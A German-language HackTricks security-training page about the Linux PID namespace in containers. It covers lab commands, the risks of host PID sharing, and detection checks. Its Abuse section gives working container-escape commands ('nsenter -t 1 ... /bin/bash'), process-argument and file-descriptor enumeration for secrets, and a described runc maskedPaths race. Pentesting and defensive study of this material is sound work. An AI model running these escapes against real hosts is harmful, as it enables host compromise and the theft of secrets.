# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Überblick

Der PID-Namespace steuert, wie Prozesse nummeriert werden und welche Prozesse sichtbar sind. Deshalb kann ein container seinen eigenen PID 1 haben, obwohl es kein echtes System ist. Innerhalb des Namespace sieht die Workload eine vermeintlich lokale Prozesshierarchie. Außerhalb des Namespace sieht der Host weiterhin die echten Host-PIDs und die komplette Prozesslandschaft.

Aus Sicht der Sicherheit ist der PID-Namespace wichtig, weil Prozesssichtbarkeit wertvoll ist. Sobald eine Workload Host-Prozesse sehen kann, kann sie Service-Namen, Kommandozeilenargumente, in Prozessargumente übergebene Secrets, über `/proc` abgeleitete Umgebungszustände und potenzielle Ziele für Namespace-Eintritte beobachten. Wenn sie mehr kann als diese Prozesse nur zu sehen — zum Beispiel Signale zu senden oder ptrace unter passenden Bedingungen zu nutzen — wird das Problem deutlich ernster.

## Funktionsweise

Ein neuer PID-Namespace beginnt mit einer eigenen internen Prozessnummerierung. Der erste darin erzeugte Prozess wird aus Sicht des Namespace PID 1, was auch bedeutet, dass er spezielle init-ähnliche Semantiken für verwaiste Kinder und Signalverhalten erhält. Das erklärt viele Container-Eigenheiten rund um init-Prozesse, das Aufräumen von Zombie-Prozessen und warum in Containern manchmal kleine init-Wrapper verwendet werden.

Die wichtige Sicherheitslektion ist, dass sich ein Prozess isoliert darstellen kann, weil er nur seinen eigenen PID-Baum sieht — diese Isolation kann jedoch bewusst aufgehoben werden. Docker macht das über `--pid=host` möglich, während Kubernetes es über `hostPID: true` erlaubt. Tritt der Container dem Host-PID-Namespace bei, sieht die Workload die Host-Prozesse direkt, und viele spätere Angriffswege werden deutlich realistischer.

## Lab

Um einen PID-Namespace manuell zu erstellen:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Die Shell sieht nun eine private Prozessansicht. Das `--mount-proc`-Flag ist wichtig, weil es eine procfs-Instanz mountet, die zum neuen PID-Namespace passt, wodurch die Prozessliste von innen konsistent ist.

Um das Verhalten von Containern zu vergleichen:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Der Unterschied ist unmittelbar und leicht nachvollziehbar, weshalb dies ein gutes erstes Lab für die Leser ist.

## Runtime Usage

Normale Container in Docker, Podman, containerd und CRI-O erhalten ihre eigene PID namespace. Kubernetes Pods erhalten in der Regel ebenfalls eine isolierte PID-Ansicht, es sei denn, der Workload fordert explizit host PID sharing an. LXC/Incus-Umgebungen basieren auf derselben Kernel-Primitive, wobei system-container-Einsatzszenarien kompliziertere Prozessbäume offenbaren und zu mehr Debugging-Abkürzungen verleiten können.

Die gleiche Regel gilt überall: Wenn die Runtime sich dafür entschieden hat, die PID namespace nicht zu isolieren, ist das eine bewusste Reduzierung der Container-Grenze.

## Misconfigurations

Die kanonische Fehlkonfiguration ist host PID sharing. Teams rechtfertigen sie oft mit Debugging, Monitoring oder Service-Management-Bequemlichkeit, aber sie sollte stets als eine bedeutsame Sicherheitsausnahme behandelt werden. Selbst wenn der Container keinen unmittelbaren Schreibzugriff auf Host-Prozesse hat, kann allein die Sichtbarkeit viel über das System verraten. Sobald Fähigkeiten wie `CAP_SYS_PTRACE` oder nützlicher procfs-Zugriff hinzugefügt werden, steigt das Risiko erheblich.

Ein weiterer Fehler besteht darin anzunehmen, dass host PID sharing harmlos sei, nur weil der Workload standardmäßig keine Host-Prozesse beenden oder per ptrace beeinflussen kann. Diese Schlussfolgerung ignoriert den Wert der enumeration, die Verfügbarkeit von namespace-entry targets und die Art und Weise, wie PID-Sichtbarkeit sich mit anderen geschwächten Kontrollen kombiniert.

## Abuse

Wenn das host PID namespace geteilt wird, kann ein Angreifer Host-Prozesse inspizieren, Prozessargumente auslesen, interessante Services identifizieren, Kandidaten-PIDs für `nsenter` lokalisieren oder Prozesssichtbarkeit mit ptrace-bezogenen Privilegien kombinieren, um Host- oder benachbarte Workloads zu stören. In manchen Fällen reicht es, den richtigen long-running Prozess zu sehen, um den Rest des Angriffsplans neu zu gestalten.

Der erste praxisorientierte Schritt ist immer, zu bestätigen, dass Host-Prozesse tatsächlich sichtbar sind:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Sobald Host-PIDs sichtbar sind, sind process arguments und namespace-entry targets oft die nützlichste Informationsquelle:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Wenn `nsenter` verfügbar ist und ausreichende Privilegien vorhanden sind, prüfen Sie, ob ein sichtbarer Host-Prozess als Namespace-Bridge verwendet werden kann:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Selbst wenn der Einstieg blockiert ist, ist das Teilen der Host-PIDs bereits wertvoll, weil es die Service-Struktur, Laufzeitkomponenten und potenziell als Nächstes anvisierbare privilegierte Prozesse offenlegt.

Die Sichtbarkeit der Host-PIDs macht außerdem file-descriptor abuse realistischer. Wenn ein privilegierter Host-Prozess oder ein benachbartes Workload eine sensible Datei oder Socket geöffnet hat, kann der Angreifer möglicherweise `/proc/<pid>/fd/` inspizieren und diesen Handle wiederverwenden, abhängig von Besitzrechten, procfs Mount-Optionen und dem Ziel-Service-Modell.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Diese Befehle sind nützlich, weil sie zeigen, ob `hidepid=1` oder `hidepid=2` die prozessübergreifende Sichtbarkeit reduzieren und ob offensichtlich interessante Deskriptoren wie open secret files, logs oder Unix sockets überhaupt sichtbar sind.

### Vollständiges Beispiel: host PID + `nsenter`

Host PID sharing wird zu einem direkten host escape, wenn der Prozess außerdem genügend Privilegien hat, um den host namespaces beizutreten:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Wenn der Befehl erfolgreich ist, wird der Containerprozess nun im Host-Mount sowie in den UTS-, network-, IPC- und PID-Namespaces ausgeführt. Die Folge ist eine sofortige Kompromittierung des Hosts.

Selbst wenn `nsenter` selbst fehlt, kann dasselbe Ergebnis über die Host-Binärdatei erreicht werden, wenn das Host-Dateisystem eingehängt ist:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Aktuelle Runtime-Hinweise

Einige Angriffe, die den PID-Namespace betreffen, sind keine traditionellen `hostPID: true` Fehlkonfigurationen, sondern Laufzeit-Implementierungsfehler bei der Anwendung von procfs-Schutzmechanismen während der Container-Einrichtung.

#### `maskedPaths` Race auf das host procfs

In verwundbaren `runc`-Versionen konnten Angreifer, die das Container-Image oder die `runc exec` Workload kontrollierten, die Maskierungsphase per Race ausnutzen, indem sie das containerseitige `/dev/null` durch einen Symlink auf einen sensiblen procfs-Pfad wie `/proc/sys/kernel/core_pattern` ersetzten. Wenn das Race erfolgreich war, konnte der masked-path Bind-Mount auf das falsche Ziel landen und hostweite procfs-Regler dem neuen Container zugänglich machen.

Nützlicher Prüfungsbefehl:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Das ist wichtig, da die letztendlichen Auswirkungen mit einer direkten procfs-Exposition identisch sein können: beschreibbares `core_pattern` oder `sysrq-trigger`, gefolgt von Codeausführung auf dem Host oder denial of service.

#### Namespace-Injektion mit `insject`

Namespace-Injection-Tools wie `insject` zeigen, dass eine Interaktion mit dem PID-Namespace nicht immer voraussetzt, vor der Prozess-Erstellung in den Zielnamespace einzutreten. Ein Helper kann sich später anhängen, `setns()` verwenden und ausführen, während die Sichtbarkeit in den Ziel-PID-Raum erhalten bleibt:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Diese Art von Technik ist vor allem für fortgeschrittenes Debugging, offensive tooling und post-exploitation-Workflows relevant, bei denen dem Namespace-Kontext beigetreten werden muss, nachdem die Laufzeit die Workload bereits initialisiert hat.

### Verwandte FD-Missbrauchsmuster

Zwei Muster sind es wert, explizit genannt zu werden, wenn host PIDs sichtbar sind. Erstens kann ein privilegierter Prozess einen sensiblen file descriptor über `execve()` offen halten, weil er nicht mit `O_CLOEXEC` markiert wurde. Zweitens können Services file descriptors über Unix-Sockets mittels `SCM_RIGHTS` weiterreichen. In beiden Fällen ist das interessante Objekt nicht mehr der Pfadname, sondern das bereits geöffnete Handle, das ein Prozess mit geringeren Rechten erben oder erhalten kann.

Das ist in der Container-Arbeit relevant, weil das Handle auf `docker.sock`, ein privilegiertes Log, eine Host-Secret-Datei oder ein anderes wertvolles Objekt zeigen kann, selbst wenn der Pfad selbst vom Container-Dateisystem aus nicht direkt erreichbar ist.

## Prüfungen

Der Zweck dieser Befehle ist festzustellen, ob der Prozess eine private PID-Ansicht hat oder ob er bereits eine deutlich breitere Prozesslandschaft auflisten kann.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Was hier interessant ist:

- Wenn die Prozessliste offensichtliche Host-Dienste enthält, ist host PID sharing wahrscheinlich bereits aktiv.
- Dass man nur einen winzigen, container-localen Baum sieht, ist die normale Ausgangslage; `systemd`, `dockerd`, oder nicht zugehörige Daemons zu sehen, ist es nicht.
- Sobald host PIDs sichtbar sind, werden selbst schreibgeschützte Prozessinformationen zu nützlicher Aufklärung.

Wenn du einen Container findest, der mit host PID sharing läuft, behandle das nicht als kosmetischen Unterschied. Es ist eine wesentliche Änderung dessen, was die Workload beobachten und potenziell beeinflussen kann.
{{#include ../../../../../banners/hacktricks-training.md}}
